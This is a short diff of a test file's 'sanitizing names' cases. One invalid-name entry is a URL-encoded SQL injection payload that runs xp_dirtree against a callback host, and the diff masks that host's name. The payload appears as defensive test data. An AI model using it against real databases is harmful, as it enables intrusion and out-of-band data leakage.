@@ -697,7 +697,7 @@ describe('triggers', () => {
 
 describe('sanitizing names', () => {
   const invalidNames = [
-    `test'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cxxxxxxxxxxxxxxx.oasti'%2b'fy.com%5cxus'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20`,
+    `test'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cxxxxxxxxxxxxxxx.yyyyy'%2b'fy.com%5cxus'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20`,
     `test.function.name`,
   ];
 
